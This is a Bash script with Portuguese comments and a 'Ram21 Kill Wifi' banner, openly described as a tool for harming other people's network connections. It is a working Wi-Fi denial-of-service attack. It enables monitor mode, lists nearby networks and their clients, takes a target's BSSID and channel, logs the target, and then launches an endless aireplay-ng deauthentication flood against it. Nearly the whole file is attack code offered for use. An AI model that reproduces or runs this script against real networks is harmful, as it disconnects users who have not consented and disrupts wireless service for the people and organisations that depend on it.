#!/usr/bin/env bash

#Ferramenta prejudicial conexão de rede de terceiros.
#Tenha consciência de seus atos.
#Lembre-se com grandes poderes vem grandes responsabilidades.....
#Criando em KALI LINUX 2021 ZSH
log="/root/target.txt"

red="\e[31;1m"
green="\e[32;1m"
cor="\e[m"   

cat 2>/dev/null <<EOF
  _____                 ___  __     
 |  __ \               |__ \/_ |    
 | |__) |__ _ _ __ ___    ) || |    
 |  _  // _` | '_ ` _ \  / / | |    
 | | \ \ (_| | | | | | |/ /_ | |    
 |_|  \_\__,_|_| |_| |_|____||_|    
  _  ___ _ _  __          ___  __ _ 
 | |/ (_) | | \ \        / (_)/ _(_)
 | ' / _| | |  \ \  /\  / / _| |_ _ 
 |  < | | | |   \ \/  \/ / | |  _| |
 | . \| | | |    \  /\  /  | | | | |
 |_|\_\_|_|_|     \/  \/   |_|_| |_|
                                    
                                    



EOF
echo -e "${green}Iniciando...${cor}"
sleep 2s ; clear
#=========Verificando nome da placa======================================



#=========ENTRANDO EM MODO MONITOR=======================================
read -p $'\e[31;1mNome de sua placa:\e[m' mon
airmon-ng start ${mon}
if ifconfig | grep 'mon'
then
	mon="${mon}mon"
fi
#========Iniciando ataque=================================================
sleep 2s
echo -e "${red}Listando redes... Use CTRL+C para parar a listagem e escolher um alvo.${cor}"
sleep 2s
airodump-ng $mon

read -p $'\e[31;1mBSSID: \e[m' _bssid
read -p $'\e[31;1mCanal: \e[m' _canal
read -p $'\e[31;1mESSID: \e[m' _essid

echo -e "${red}Exbindo dispositivos conectados nessa rede, para continuar use CTRL+C${cor}"
sleep 1s
airodump-ng --bssid $_bssid -c $_canal $mon
sleep 1s
clear

#===============================================================================
cat >> $log <<EOF
===ATAQUE EFETUADO EM: $(date +%d/%m/%Y) $(date +%H:%M) por: $USER =======
ALVO: $_bssid
CANAL: $_canal
NOME: $_essid
=========================================================

EOF
#================================================================================


echo -e "${red}Iniciando ataque a rede: ${_bssid}/${_canal}\npara interromper o ataque use CTRL+C... Registro salvo em ${log}	${cor}"
sleep 4s ; clear
aireplay-ng -a $_bssid -0 0 $mon

